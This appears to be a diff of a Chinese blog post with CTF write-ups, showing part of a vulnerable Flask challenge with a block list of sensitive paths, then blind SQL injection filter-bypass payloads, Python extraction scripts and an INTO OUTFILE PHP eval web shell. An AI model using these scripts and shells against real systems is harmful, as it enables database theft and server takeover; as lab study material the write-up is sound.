 </span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 渲染模板并返回响应</span>
 </span></span><span class="line"><span class="cl">        <span class="n">resp_text</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
 </span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!DOCTYPE html&gt;
 </span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;html&gt;
@@ -1707,50 +1951,326 @@
 </span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/body&gt;
 </span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/html&gt;
 </span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">api_url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span><span class="o">+</span><span class="s2">&#34;/api&#34;</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 设置响应头</span>
 </span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">resp_text</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Credentials&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">resp</span>
 </span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 捕获异常</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;Token is invalid!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span><span class="p">,</span> <span class="mi">401</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义执行路由</span>
 </span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/execute&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">execute</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取 Cookie 中的令牌</span>
 </span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 验证令牌</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">True</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取 API 地址</span>
 </span></span><span class="line"><span class="cl">    <span class="n">api_address</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;api_address&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">api_address</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 检查 API 地址是否存在</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;No api address!&#34;</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 发送请求并返回响应</span>
 </span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">api_address</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;token&#39;</span><span class="p">:</span> <span class="n">token</span><span class="p">})</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义 API 路由</span>
 </span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/api&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">api</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取 Cookie 中的令牌</span>
 </span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 验证令牌</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">True</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 返回服务器信息</span>
 </span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Server Info: </span><span class="si">{</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;uname -a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Credentials&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义静态文件路由</span>
 </span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&lt;path:file&gt;&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">static_file</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 打印文件路径</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 定义受限关键词</span>
 </span></span><span class="line"><span class="cl">    <span class="n">restricted_keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;proc&#34;</span><span class="p">,</span> <span class="s2">&#34;env&#34;</span><span class="p">,</span> <span class="s2">&#34;passwd&#34;</span><span class="p">,</span> <span class="s2">&#34;shadow&#34;</span><span class="p">,</span> <span class="s2">&#34;hosts&#34;</span><span class="p">,</span> <span class="s2">&#34;sys&#34;</span><span class="p">,</span> <span class="s2">&#34;log&#34;</span><span class="p">,</span> <span class="s2">&#34;etc&#34;</span><span class="p">,</span> 
 </span></span><span class="line"><span class="cl">                           <span class="s2">&#34;bin&#34;</span><span class="p">,</span> <span class="s2">&#34;lib&#34;</span><span class="p">,</span> <span class="s2">&#34;tmp&#34;</span><span class="p">,</span> <span class="s2">&#34;var&#34;</span><span class="p">,</span> <span class="s2">&#34;run&#34;</span><span class="p">,</span> <span class="s2">&#34;dev&#34;</span><span class="p">,</span> <span class="s2">&#34;home&#34;</span><span class="p">,</span> <span class="s2">&#34;boot&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查文件路径是否包含受限关键词</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">keyword</span> <span class="ow">in</span> <span class="n">file</span> <span class="k">for</span> <span class="n">keyword</span> <span class="ow">in</span> <span class="n">restricted_keywords</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;STOP!&#34;</span><span class="p">,</span> <span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查文件是否存在</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;./static/&#34;</span> <span class="o">+</span> <span class="n">file</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;Not found!&#34;</span><span class="p">,</span> <span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 返回文件内容</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s2">&#34;./static/&#34;</span> <span class="o">+</span> <span class="n">file</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 应用入口</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 启动 Flask 应用</span>
 </span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h1 id="week4">week4
+</h1><h2 id="pangbai-过家家4"><strong>PangBai 过家家（4）</strong>
+</h2><h2 id="blindsql2"><strong>blindsql2</strong>
+</h2><h3 id="时间盲注-过滤空格等号substrascii">时间盲注-过滤空格，/，等号，substr,ascii
+</h3><p>没啥回显，一眼打时间盲注，测试发现单引号闭合</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?student_name=1&#39;%23
+</span></span></code></pre></td></tr></table>
 </div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?student_name=1&#39;%09and%091like1%23		#测试发现过滤了空格，/，等号
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?student_name=1&#39;%09or%09if(1&gt;0,sleep(3),0)%23		#继续测试是时间盲注没问题，好像and被过滤了？？？
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?student_name=1&#39;%09or%09if((Ord(mid((select%09database()),1,1))&gt;0),sleep(3),0)%23	#没问题，页面有延时，ascii,substr被过滤了,和上面的布尔盲注差不多
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.7.115:62368/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = f&#39;select%09database()&#39;    #查一下默认数据库</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = f&#39;select%09group_concat(schema_name)%09from%09information_schema.schemata&#39;#查所有数据库</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = f&#39;select%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema%09like%09&#34;ctf&#34;&#39;		</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = f&#39;select%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_name%09like%09&#34;secrets&#34;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;select%09group_concat(id,secret_key,secret_value)%09from%09ctf.secrets&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload_1</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;?student_name=1&#39;%09or%09if((Ord(mid((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">),sleep(3),0)%23&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload_1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250523001458980.png" alt="image-20250523001458980" style="zoom:50%;" />
+<h1 id="week5">week5
+</h1><h2 id="sqlshell"><strong>sqlshell</strong>
+</h2><p>直接套上面的布尔盲注</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.7.115:57214/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>  <span class="c1"># 使用整数除法</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 根据需要切换payload</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = &#34;sElect%09group_concat(table_name)%09FRom%09infOrmation_schema.tables%09Where%09table_schema%09like%09database()&#34;#courses,secrets,students</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = &#34;sElect%09group_concat(column_name)%09FRom%09infOrmation_schema.columns%09Where%09table_name%09like%09&#39;secrets&#39;&#34;#id,secret_key,secret_value</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;sElect</span><span class="si">%09g</span><span class="s2">roup_concat(id,secret_key,secret_value)</span><span class="si">%09f</span><span class="s2">rom%09`secrets`&#34;</span>       <span class="c1">#这里here_is_flag要用反引号才行，单引号不行，反引号用于标识数据库、表、列等对象的名称。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 构造正确的URL字符串（注意去掉了末尾逗号）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">current_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">?student_name=Alice&#39;%09and%09Ord(mid((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">%23&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">current_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Alice&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] 当前结果: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="mi">1</span><span class="n">hintThe</span> <span class="n">variable</span> <span class="err">`</span><span class="n">secure_file_priv</span><span class="err">`</span> <span class="ow">is</span> <span class="s1">&#39;&#39;</span><span class="o">.</span> <span class="n">You</span> <span class="n">should</span> <span class="k">try</span> <span class="n">to</span> <span class="n">write</span> <span class="n">a</span> <span class="n">webshell</span> <span class="n">to</span> <span class="n">the</span> <span class="n">server</span><span class="o">.</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>告诉我们要写马拿flag，那就写！</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">student_name</span><span class="o">=</span><span class="n">Alice</span><span class="s1">&#39;/**/union/**/select/**/1,2,&#39;</span><span class="o">&lt;</span><span class="err">?</span><span class="o">=</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span><span class="s1">&#39;into/**/outfile/**/&#39;</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="mf">1.</span><span class="n">php</span><span class="s1">&#39;%23		#其实此题是没有任何过滤的，就是单纯考你写一句话木马</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就url/1.php,再post执行命令就好</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system(&#39;ls /&#39;);
+</span></span><span class="line"><span class="cl">system(&#39;cat /you_cannot_read_the_flag_directly&#39;) #出题人竟然想误导我
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">tips</span>
+</span></span><span class="line"><span class="cl"><span class="n">mysql</span> <span class="n">启动时</span><span class="err">，</span><span class="n">加了选项</span> <span class="o">--</span><span class="n">secure_file_priv</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="err">，</span><span class="n">这个的选项作用是允许</span> <span class="n">mysql</span> <span class="n">进行文件读写</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">如果这个选项是</span> <span class="n">NULL</span><span class="err">，</span><span class="n">说明不能进行文件读写</span>
+</span></span><span class="line"><span class="cl"><span class="n">如果这个选项是指定的目录</span><span class="err">，</span><span class="n">说明只能对指定目录进行文件读写</span>
+</span></span><span class="line"><span class="cl"><span class="n">如果这个选项是空字符串</span><span class="err">，</span><span class="n">也就是</span> <span class="s1">&#39;&#39;</span><span class="err">，</span><span class="n">能对任意目录进行文件读写</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一开始我以为必须要union才可以写一句话，但是看了下面一篇文章，有了更深的理解</p>
+<p><a class="link" href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html"  target="_blank" rel="noopener"
+    >MySQL写shell | 狼组安全团队公开知识库</a></p>
+<p>下面这个不用union</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">student_name</span><span class="o">=</span><span class="n">Alice</span><span class="s1">&#39; into outfile &#39;</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="mf">2.</span><span class="n">php</span><span class="s1">&#39; FIELDS TERMINATED BY &#39;</span><span class="o">&lt;</span><span class="err">?</span><span class="o">=</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span><span class="s1">&#39;%23</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后由于上面两个盲注过滤了union，所以我就用下面这个打，发现还过滤了/，编码也没绕过（会自动转义），然后打一句话要绝对路径所以上面的盲注还是打不了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">student_name</span><span class="o">=</span><span class="n">Alice</span><span class="s1">&#39;</span><span class="si">%09i</span><span class="s1">nto</span><span class="si">%09o</span><span class="s1">utfile%09&#39;</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">.</span><span class="mf">2.</span><span class="n">php</span><span class="s1">&#39;</span><span class="si">%09F</span><span class="s1">IELDS%09TERMINATED%09BY%09&#39;</span><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span><span class="o">%</span><span class="mi">09</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span><span class="s1">&#39;%23</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>至此，sql结束，相比于23年的newstar的sql，24年的显然更难些，</p>
+
 </section>
 
 
@@ -1792,6 +2312,32 @@
             
                 
